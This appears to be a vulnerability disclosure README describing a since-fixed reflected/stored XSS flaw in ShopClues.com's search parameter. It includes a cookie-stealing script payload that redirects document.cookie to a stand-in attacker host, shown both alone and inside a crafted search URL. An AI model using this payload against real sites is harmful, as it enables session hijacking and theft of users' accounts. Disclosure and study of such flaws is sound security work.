# Reflected-Stored-XSS-POC
This proof of concept is based on the reflected and stored XSS vulnerability on the Indian Ecommerce website 'ShopClues.com'. This vulnerability can cause session hijacking and stealing of customer's credentials via cookie hijacking. The issue was reported in the year 2018 and it took them more than 4 months to fix the bug. 

Vulnerability Description: 

Severity : Medium to Critical

Impact: User’s account and the stored data is compromised.
If the user is tricked into clicking on a malicious link from the shopclues.com domain, especially under the search parameter from the parent site, different malicious scripts can be executed. For e.g.  The link makes a request in the form of a search string which executes a script demanding the session cookies of the victim browser. The script can also be extended to redirect the victim bowser’s cookies to the attacker site which captures the cookies. 

<script>alert(location.href=”https://www.attackersite.com/cookie_steal.php?cookie=” + document.cookie)</script>                                                                                                                          
 
The above script when requested in the form as :

https://shopclues.com/search?q=<script>alert(location.href=”https://www.attackersite.com/cookie_steal.php?cookie=” + document.cookie)</script>

will bypass the firewall and xss auditor(In case of Google chrome browser) of the browser as the GET/POST request is made under the trusted network and domain.
The search box will not parse the script and will show no or relevant search results. But when the search box is cleared, the script is parsed in the search history . The XSS attack will be reflected until the search history is not cleared. This behaviour of the script is similar to persistent or stored XSS type.
The above script will first pop up an alert box displaying the cookies. The alert box will prevent the redirection script to execute. But when the victim travels to another tab or minimises  the tab , this alert box goes down and allows the redirection . The malicious webpage then grabs the victim’s cookies.The attacker can then replace the victim’s cookies and hijack the session. 

Reference : https://www.owasp.org/index.php/Cross-site_Scripting_(XSS),
https://www.owasp.org/index.php/Session_hijacking_attack,
https://www.owasp.org/index.php/Session_fixation 
